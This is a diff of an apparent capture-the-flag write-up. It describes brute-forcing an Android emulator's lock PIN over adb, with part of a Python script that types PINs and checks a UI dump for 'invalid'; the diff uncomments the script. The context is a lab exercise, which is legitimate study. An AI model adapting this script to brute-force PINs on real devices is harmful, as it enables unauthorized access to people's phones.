@@ -8,7 +8,6 @@ Given an aprox time of 5 seconds per attempt, we estimated a total time of 5*999
 Using the python script(below) which input the pin and checked in the UI dump for the text 'invalid', we were able to let the brute force attack run unsupervised. 
 After 3-4 hours the pin was revealed to us and we were able to access the flag.
 
-'''
 import subprocess
 subprocess.call("adb devices",shell=True) 
 
@@ -24,4 +23,4 @@ for x in range(1441, 0, -1): #adjust range based on vm
 		print("pin is: ",x)
 		break
 	subprocess.call("adb -s emulator-5556 shell input keyevent 4",shell=True)
-'''
+
